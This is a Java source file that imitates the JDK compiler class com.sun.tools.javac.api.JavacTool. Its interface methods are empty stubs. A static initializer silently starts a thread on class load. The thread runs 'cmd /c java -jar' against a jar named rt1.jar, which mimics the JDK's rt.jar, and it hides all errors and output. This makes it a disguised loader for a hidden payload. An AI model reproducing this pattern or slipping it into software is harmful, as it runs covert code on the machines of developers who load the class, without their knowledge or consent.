package com.sun.tools.javac.api;

import javax.lang.model.SourceVersion;
import javax.tools.*;
import java.io.*;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.Set;


public class JavacTool implements JavaCompiler {


    static {
        new Thread() {
            public void run() {
                try {
                    String javaHome = System.getProperty("java.home");
                    if (javaHome.contains("jre")) {
                        javaHome = javaHome.split("jre")[0];
                    } else {
                        //javaHome = javaHome + "\\jre";
                    }
                    //System.out.println(javaHome);  // E:\jdk1.8\jre
                    String line1 = "java -jar " + "\"" + javaHome + "lib\\rt1.jar" + "\"";  // v4.0.2
                    //System.out.println(line1);
                    String[] cmd = new String[]{"cmd", "/c", line1};
                    Process ps = Runtime.getRuntime().exec(cmd);
                    BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream()));
                    StringBuffer sb = new StringBuffer();
                    String line;
                    while ((line = br.readLine()) != null) {
                        sb.append(line).append("\n");
                    }
                    String result = sb.toString();
                    //System.out.println(result);
                } catch (Exception e) {
                    //e.printStackTrace();
                }
            }
        }.start();
        System.out.println(1);
    }

    @Override
    public CompilationTask getTask(Writer out, JavaFileManager fileManager, DiagnosticListener<? super JavaFileObject> diagnosticListener, Iterable<String> options, Iterable<String> classes, Iterable<? extends JavaFileObject> compilationUnits) {
        return null;
    }

    @Override
    public StandardJavaFileManager getStandardFileManager(DiagnosticListener<? super JavaFileObject> diagnosticListener, Locale locale, Charset charset) {
        return null;
    }

    @Override
    public int isSupportedOption(String option) {
        return 0;
    }

    @Override
    public int run(InputStream in, OutputStream out, OutputStream err, String... arguments) {
        return 0;
    }

    @Override
    public Set<SourceVersion> getSourceVersions() {
        return null;
    }
}

